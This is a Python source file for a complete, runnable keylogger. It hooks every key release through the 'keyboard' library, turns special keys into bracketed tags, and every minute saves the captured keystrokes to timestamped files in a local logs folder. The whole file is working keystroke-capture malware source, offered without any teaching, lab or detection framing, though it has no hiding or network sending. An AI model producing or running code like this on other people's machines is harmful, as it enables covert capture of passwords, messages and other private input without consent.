import keyboard
import time
from datetime import datetime
import os
from threading import Timer


class Keylogger:
    def __init__(self, interval=60, log_file="keylog.txt"):
        """
        Initialize the keylogger with specified interval (in seconds)
        and log file name.
        """
        self.interval = interval
        self.log_file = log_file
        self.log = ""
        self.start_time = datetime.now()
        self.end_time = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event occurs
        """
        name = event.name
        if len(name) > 1:
            # Handle special keys
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == "tab":
                name = "[TAB]"
            elif name == "backspace":
                name = "[BACKSPACE]"
            else:
                # Wrap special keys in square brackets
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        """
        Update the filename with current timestamp
        """
        start_dt_str = self.start_time.strftime("%Y-%m-%d_%H-%M-%S")
        end_dt_str = self.end_time.strftime("%Y-%m-%d_%H-%M-%S")
        return f"keylog_{start_dt_str}_{end_dt_str}.txt"

    def report(self):
        """
        Create a log file with the current timestamp
        """
        if self.log:  # Only create a file if there's something to log
            self.end_time = datetime.now()
            filename = self.update_filename()

            # Create a logs directory if it doesn't exist
            if not os.path.exists("logs"):
                os.mkdir("logs")

            log_path = os.path.join("logs", filename)

            with open(log_path, "w") as f:
                # Write a header with the timestamp information
                f.write(f"Keylog Report\n")
                f.write(f"Start Time: {self.start_time}\n")
                f.write(f"End Time: {self.end_time}\n")
                f.write("-" * 50 + "\n\n")
                f.write(self.log)

            print(f"[+] Saved keylog to {log_path}")

            # Reset the log and start time
            self.log = ""
            self.start_time = datetime.now()

        # Schedule the next report
        self.timer = Timer(interval=self.interval, function=self.report)
        self.timer.daemon = True
        self.timer.start()

    def start(self):
        """
        Start the keylogger
        """
        self.start_time = datetime.now()

        # Create initial info message
        print(f"[*] Keylogger started at {self.start_time}")
        print(f"[*] Logging keystrokes every {self.interval} seconds")
        print(f"[*] Press Ctrl+C to exit")

        # Start the timer
        self.report()

        # Start the keyboard listener
        keyboard.on_release(callback=self.callback)

        try:
            # Keep the program running
            keyboard.wait()
        except KeyboardInterrupt:
            print("\n[*] Keylogger stopped")
            # Stop the timer if it's still active
            if hasattr(self, 'timer'):
                self.timer.cancel()
            # Final report before exiting
            self.report()


if __name__ == "__main__":
    # Create and start the keylogger with a 60-second interval
    # You can change this value to adjust how frequently logs are saved
    keylogger = Keylogger(interval=60)
    keylogger.start()